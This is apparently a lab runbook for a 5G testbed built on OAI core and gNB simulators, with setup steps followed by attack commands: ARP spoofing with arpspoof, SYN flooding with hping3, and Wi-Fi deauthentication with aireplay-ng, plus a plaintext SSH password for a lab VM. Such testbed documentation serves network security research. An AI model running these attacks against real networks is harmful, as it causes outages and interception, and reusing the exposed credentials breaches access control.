## Common Steps for All the Attacks

### 1. Log into VM in the Testbed with OAI Installation
```bash
ssh kryptowire@10.80.103.50
Password: krypto@123
```

### 2. OAI 5G Core
- **Git Repo Used:** [OAI 5G Core GitLab Repo](https://gitlab.eurecom.fr/oai/cn5g/oai-cn5g-fed.git)
- **Docs Link for Instructions:** [OAI 5G Core Docs](https://gitlab.eurecom.fr/oai/cn5g/oai-cn5g-fed/-/tree/master/docs?ref_type=heads)

#### Commands:
```bash
cd /home/kryptowire/oai-core/oai-cn5g-fed/docker-compose
python3 ./core-network.py --type start-basic --scenario 1
```
- Wait for the core network docker containers to be up and running: Use `docker ps` command to check the status.

### 3. Launch gNBsims
#### Commands:
```bash
cd /home/kryptowire/oai-core/oai-cn5g-fed/docker-compose
docker-compose -f docker-compose-gnbsim.yaml up -d gnbsim
```

### 4. Launch OAI gNB with COTSUE
- **GitHub Repo Used:** [OAI gNB GitLab Repo](https://gitlab.eurecom.fr/oai/openairinterface5g.git)

#### Commands:
```bash
cd ~/openairinterface5g/cmake_targets/ran_build/build
sudo ./nr-softmodem -O ../../../targets/PROJECTS/GENERIC-NR-5GC/CONF/gnb.sa.band77.fr1.273PRB.2x2.usrpn300.conf --sa --usrp-tx-thread-config 1 -E --continuous-tx
```
- Once gNB connects to core network, connect COTSUE to the gNB.

### 5. Experimentation Setup
- The setup contains OAI core connected with 2 gNBsims and COTSUE.

## Attacks Integration
### Common Step for Launching Attacks
- Log into gNBsim container
- Once inside the container launch attack command
```bash
docker ps
docker exec -it <container-id> /bin/bash
```

### IP/ARP Spoofing
#### Command:
```bash
arpspoof -i wlan0 -t 192.168.1.1 192.168.1.18
```
- Run this command from gNBsim attacking COTSUE. When gNBsim and COTSUE connect to the core, they will be assigned IPs in the same subnet.

### SYN Flooding
#### Command:
```bash
hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.70.156
```
- Run this command from the gNBsim container and flood with SYN packets to COTSUE and 2 gNBsims.

## SYN Flooding from OAI Core AMF to UPF
#### Command:
```bash
hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.70.156
```
Run this command from the OAI core AMF container and flood with SYN packets to UPF.

Additional Step: Log into OAI Core AMF Container

- Run docker ps to get the container ID.
Log into the AMF container:
```bash
docker exec -it <container-id> /bin/bash
```
- Once inside the container, launch the attack command.


### Deauthentication
#### Command:
```bash
aireplay-ng -0 0 -a 10:DA:43:73:2A:3C -c 30:23:03:5E:2B:2B wlan0
```
- For this attack, tether COTSUE connection via router and connect 2 UEs to the WiFi. Then launch the attack from one UE to the other UE.
